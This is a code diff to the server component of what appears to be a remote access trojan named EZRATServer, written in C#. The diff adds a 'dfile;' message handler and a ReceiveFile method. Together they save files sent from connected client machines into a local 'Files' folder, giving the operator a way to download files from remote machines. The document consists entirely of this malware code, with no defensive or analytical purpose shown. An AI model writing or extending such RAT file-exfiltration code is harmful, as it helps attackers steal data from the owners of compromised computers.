@@ -599,8 +599,6 @@ namespace EZRATServer
                 Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
                 bool ignoreFlag = false; //Declare the ignore flag
 
-
-
                 try //Try
                 {
                     text = Encoding.Default.GetString(recBuf); //Get the text from the receive buffer
@@ -649,6 +647,14 @@ namespace EZRATServer
                         string[] result = msg.Split('¦');
                         cht.UpdateAllData(result);
                     }
+                    else if (text.StartsWith("dfile;"))
+                    {
+                        text = text.Substring(6);
+                        byte[] recFile = Encoding.Default.GetBytes(text);
+                        string path = Environment.CurrentDirectory;
+                        this.fl.Invoke(new MethodInvoker(() => path += "\\Files" + this.fl.PathDownload.Substring(this.fl.PathDownload.LastIndexOf('\\'))));
+                        ReceiveFile(recFile, path);
+                    }
                 }
 
 
@@ -656,6 +662,20 @@ namespace EZRATServer
 
 
             if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
+        }
+
+
+        private void ReceiveFile(byte[] data, string path)
+        {
+
+
+            string dir = path.Substring(0,path.LastIndexOf('\\'));
+            if (!Directory.Exists(dir))
+            {
+                Directory.CreateDirectory(dir);
+            }
+            File.WriteAllBytes(path, data);
+
         }
 
 
